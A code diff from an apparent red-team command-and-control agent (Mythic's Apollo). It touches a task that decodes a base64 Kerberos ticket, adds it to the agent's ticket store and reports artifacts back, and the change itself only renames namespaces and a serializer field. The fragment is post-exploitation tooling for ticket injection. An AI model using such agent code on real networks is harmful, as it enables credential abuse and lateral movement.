@@ -10,10 +10,10 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.Serialization;
-using PhantomInterop.Classes;
-using PhantomInterop.Features.KerberosTickets;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Features.KerberosTickets;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 
 namespace Tasks;
 
@@ -52,7 +52,7 @@ public class ticket_store_add : Tasking
         MythicTaskResponse resp = new MythicTaskResponse { };
         try
         {
-            TicketStoreAddParameters parameters = _dataSerializer.Deserialize<TicketStoreAddParameters>(_data.Parameters);
+            TicketStoreAddParameters parameters = _jsonSerializer.Deserialize<TicketStoreAddParameters>(_data.Parameters);
             string base64Ticket = parameters.base64Ticket;
             byte[] ticketBytes = Convert.FromBase64String(base64Ticket);
             KerberosTicket ticket = new KerberosTicket();
@@ -73,7 +73,7 @@ public class ticket_store_add : Tasking
         {
             resp = CreateTaskResponse($"Failed to add ticket into store: {e.Message}", true, "error");
         }
-        
+        //get and send back any artifacts
         IEnumerable<Artifact> artifacts = _agent.GetTicketManager().GetArtifacts();
         var artifactResp = CreateArtifactTaskResponse(artifacts);
         _agent.GetTaskManager().AddTaskResponseToQueue(artifactResp);
